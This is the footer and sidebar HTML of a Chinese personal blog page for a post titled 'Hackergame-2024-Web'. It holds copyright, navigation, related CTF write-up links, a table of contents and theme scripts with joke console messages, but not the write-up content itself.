</article><div class="post-copyright"><div class="copyright-cc-box"><i class="anzhiyufont anzhiyu-icon-copyright"></i></div><div class="post-copyright__author_box"><a class="post-copyright__author_img" href="/" title="头像"><img class="post-copyright__author_img_back" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/Avatar.jpg" title="头像" alt="头像"><img class="post-copyright__author_img_front" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/Avatar.jpg" title="头像" alt="头像"></a><div class="post-copyright__author_name">xxshh</div><div class="post-copyright__author_desc"></div></div><div class="post-copyright__post__info"><a class="post-copyright__original" title="该文章为原创文章，注意版权协议" href="http://example.com/2024/11/03/Hackergame-2024-Web/">原创</a><a class="post-copyright-title"><span onclick="rm.copyPageUrl('http://example.com/2024/11/03/Hackergame-2024-Web/')">Hackergame-2024-Web</span></a></div><div class="post-copyright__notice"><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank"></a>！</span></div></div><div class="post-tools-right"><div class="tag_share"><div class="post-meta__box"><div class="post-meta__box__tag-list"><a class="post-meta__box__tags" href="/tags/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"><span class="tags-punctuation"> <i class="anzhiyufont anzhiyu-icon-tag"></i></span>CTF刷题记录<span class="tagsPageCount">6</span></a></div></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/10/27/NewStar-CTF-2024-Week2-Web/"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E7%B4%AB.jpg?_r_=9a7af9e7-0155-2554-fbf0-b6f1504d3e41" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">NewStar-CTF-2024-Week2-Web</div></div></a></div><div class="next-post pull-right"><a href="/2024/11/05/Node.js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E7%B2%89.jpg?_r_=a3dc5c1c-2e6f-944c-e26c-f60ed0a08c39" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Node.js原型链污染</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="anzhiyufont anzhiyu-icon-thumbs-up fa-fw" style="font-size: 1.5rem; margin-right: 4px"></i><span>喜欢这篇文章的人也看了</span></div><div class="relatedPosts-list"><div><a href="/2024/11/11/BUUCTF-Web-WP2/" title="BUUCTF-Web-WP2"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E7%B4%AB.jpg?_r_=2f819b0b-3655-8c1e-db5d-7ec0903d1a9b" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-11-11</div><div class="title">BUUCTF-Web-WP2</div></div></a></div><div><a href="/2024/11/12/BUUCTF-N1BOOK/" title="BUUCTF-N1BOOK"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E7%B2%89.jpg?_r_=245c4457-0d0e-82e0-ca24-684ea85b1173" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-11-12</div><div class="title">BUUCTF-N1BOOK</div></div></a></div><div><a href="/2024/10/27/NewStar-CTF-2024-Week2-Web/" title="NewStar-CTF-2024-Week2-Web"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E7%B4%AB.jpg?_r_=9a7af9e7-0155-2554-fbf0-b6f1504d3e41" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-10-27</div><div class="title">NewStar-CTF-2024-Week2-Web</div></div></a></div><div><a href="/2024/09/06/BUUCTF-Web-WP1/" title="BUUCTF Web 解题记录"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E7%81%B0.jpg?_r_=d5a6465e-9b9e-65f7-4790-22581b6c53b9" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-09-06</div><div class="title">BUUCTF Web 解题记录</div></div></a></div><div><a href="/2024/10/25/NewStar-CTF-2024-Week1-Web/" title="NewStar-CTF-2024-Week1-Web"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E7%B4%AB.jpg?_r_=ed0ef9c3-2475-560f-85b0-7f434c898e85" alt="cover"><div class="content is-center"><div class="date"><i class="anzhiyufont anzhiyu-icon-calendar-days fa-fw"></i> 2024-10-25</div><div class="title">NewStar-CTF-2024-Week1-Web</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-announcement"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bullhorn anzhiyu-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来看我的博客~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-bars"></i><span>文章目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AD%BE%E5%88%B0"><span class="toc-number">1.</span> <span class="toc-text">签到</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#PaoluGPT"><span class="toc-number">2.</span> <span class="toc-text">PaoluGPT</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%96%9C%E6%AC%A2%E5%81%9A%E7%AD%BE%E5%88%B0%E7%9A%84-CTFer-%E4%BD%A0%E4%BB%AC%E5%A5%BD%E5%91%80"><span class="toc-number">3.</span> <span class="toc-text">喜欢做签到的 CTFer 你们好呀</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AF%94%E5%A4%A7%E5%B0%8F%E7%8E%8B"><span class="toc-number">4.</span> <span class="toc-text">比大小王</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Node-js-is-Web-Scale"><span class="toc-number">5.</span> <span class="toc-text">Node.js is Web Scale</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%A6%81%E6%AD%A2%E5%86%85%E5%8D%B7"><span class="toc-number">6.</span> <span class="toc-text">禁止内卷</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/12/10/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="PHP反序列化漏洞"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E7%B4%AB.jpg?_r_=0d3a1a60-2b1e-1c7d-cfeb-f7cf3144f11b" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="PHP反序列化漏洞"/></a><div class="content"><a class="title" href="/2024/12/10/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" title="PHP反序列化漏洞">PHP反序列化漏洞</a><time datetime="2024-12-10T07:50:36.000Z" title="发表于 2024-12-10 15:50:36">2024-12-10</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/09/XXE%E6%BC%8F%E6%B4%9E/" title="XXE漏洞"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E7%BB%BF.jpg?_r_=f78bb254-666a-e2b9-ab21-a8a89a881a6b" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="XXE漏洞"/></a><div class="content"><a class="title" href="/2024/12/09/XXE%E6%BC%8F%E6%B4%9E/" title="XXE漏洞">XXE漏洞</a><time datetime="2024-12-09T06:56:21.000Z" title="发表于 2024-12-09 14:56:21">2024-12-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/09/RCE%E6%BC%8F%E6%B4%9E/" title="RCE漏洞"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E8%93%9D.jpg?_r_=605d3cf6-bc9f-9bfc-22cb-8efaf0206ea0" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="RCE漏洞"/></a><div class="content"><a class="title" href="/2024/12/09/RCE%E6%BC%8F%E6%B4%9E/" title="RCE漏洞">RCE漏洞</a><time datetime="2024-12-09T01:42:48.000Z" title="发表于 2024-12-09 09:42:48">2024-12-09</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/08/SSRF%E6%BC%8F%E6%B4%9E/" title="SSRF漏洞"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E7%B4%AB.jpg?_r_=7d8d79dd-a74b-8f9a-7e23-62731ca401b0" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="SSRF漏洞"/></a><div class="content"><a class="title" href="/2024/12/08/SSRF%E6%BC%8F%E6%B4%9E/" title="SSRF漏洞">SSRF漏洞</a><time datetime="2024-12-08T10:42:29.000Z" title="发表于 2024-12-08 18:42:29">2024-12-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/12/07/CSRF%E6%BC%8F%E6%B4%9E/" title="CSRF漏洞"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://xxshh.github.io/images/%E9%BB%84.jpg?_r_=08e24611-f3cf-263c-26c7-18cb42a6dfa8" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="CSRF漏洞"/></a><div class="content"><a class="title" href="/2024/12/07/CSRF%E6%BC%8F%E6%B4%9E/" title="CSRF漏洞">CSRF漏洞</a><time datetime="2024-12-07T12:16:30.000Z" title="发表于 2024-12-07 20:16:30">2024-12-07</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 By xxshh</div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">5</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">0</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://image.anheyu.com/" title="安知鱼图床"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://image.anheyu.com/favicon.ico" alt="安知鱼图床"/><span class="back-menu-item-text">安知鱼图床</span></a></div></div></div><span class="sidebar-menu-item-title">标签</span></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.umd.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("31/8/2024 22:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2024 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 xxshh 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><div class="js-pjax"><input type="hidden" name="page-type" id="page-type" value="post"></div><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script async data-pjax src="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/waterfall/waterfall.js"></script><script src="https://lf3-cdn-tos.bytecdntp.com/cdn/expire-1-M/qrcodejs/1.0.0/qrcode.min.js"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.9/icon/ali_iconfont_css.css"><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.7" zIndex="-1" count="99" mobile="false" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/canvas-nest.min.js"></script><script id="click-heart" src="https://cdn.cbd.int/butterfly-extsrc@1.1.3/dist/click-heart.min.js" async="async" mobile="true"></script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.0.0/aplayer/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.cbd.int/anzhiyu-blog-static@1.0.1/js/APlayer.min.js"></script><script src="https://cdn.cbd.int/hexo-anzhiyu-music@1.0.1/assets/js/Meting2.min.js"></script><script src="https://cdn.cbd.int/pjax@0.2.8/pjax.min.js"></script><script>let pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {
  // removeEventListener scroll 
  anzhiyu.removeGlobalFnEvent('pjax')
  anzhiyu.removeGlobalFnEvent('themeChange')

  document.getElementById('rightside').classList.remove('rightside-show')
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()
})

document.addEventListener('pjax:error', e => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script charset="UTF-8" src="https://cdn.cbd.int/anzhiyu-theme-static@1.1.5/accesskey/accesskey.js"></script></div><div id="popup-window"><div class="popup-window-title">通知</div><div class="popup-window-divider"></div><div class="popup-window-content"><div class="popup-tip">你好呀</div><div class="popup-link"><i class="anzhiyufont anzhiyu-icon-arrow-circle-right"></i></div></div></div></body></html>